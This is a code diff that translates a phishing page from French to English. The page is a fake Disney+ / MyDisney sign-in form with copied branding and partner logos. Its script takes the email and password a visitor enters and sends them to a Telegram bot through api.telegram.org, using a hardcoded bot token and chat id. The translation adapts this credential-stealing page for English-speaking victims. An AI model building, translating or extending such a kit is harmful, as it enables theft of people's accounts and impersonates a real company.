@@ -1,30 +1,30 @@
 <!-- login.html -->
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Se connecter | Disney+</title>
+  <title>Sign In | Disney+</title>
   <link rel="stylesheet" href="style.css"/>
 </head>
 <body class="page-form">
   <main>
-    <!-- Logo MyDisney -->
+    <!-- MyDisney Logo -->
     <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>
 
-    <h1>Connexion</h1>
-    <p>Entrez votre adresse e-mail et votre mot de passe pour continuer.</p>
+    <h1>Sign In</h1>
+    <p>Enter your email address and password to continue.</p>
 
     <form id="loginForm">
-      <input type="email" placeholder="Adresse e-mail" required/>
-      <input type="password" placeholder="Mot de passe" required/>
-      <button type="submit">Se connecter</button>
+      <input type="email" placeholder="Email address" required/>
+      <input type="password" placeholder="Password" required/>
+      <button type="submit">Sign In</button>
     </form>
 
-    <!-- Note et logos partenaires -->
+    <!-- Note and partner logos -->
     <div class="footer-note">
-      <strong>Disney+ fait partie du groupe Walt Disney</strong><br/>
-      MyDisney vous donne accès aux services tels que Disney+, ESPN, Walt Disney World <a href="#">et bien plus</a>.
+      <strong>Disney+ is part of The Walt Disney Company</strong><br/>
+      MyDisney gives you access to services like Disney+, ESPN, Walt Disney World <a href="#">and more</a>.
       <div class="logos-container">
         <img src="Images/compose2.png" alt="Disney+"/>
         <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
@@ -51,7 +51,7 @@
       const pwd   = this.querySelector('input[type="password"]').value.trim();
       const bot   = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
       const chat  = "-4970333928";
-      const msg   = `🔐 Connexion Disney+ :\nUtilisateur : ${email}\nMot de passe : ${pwd}`;
+      const msg   = `🔐 Disney+ Sign In:\nUser: ${email}\nPassword: ${pwd}`;
 
       fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
         method: "POST",
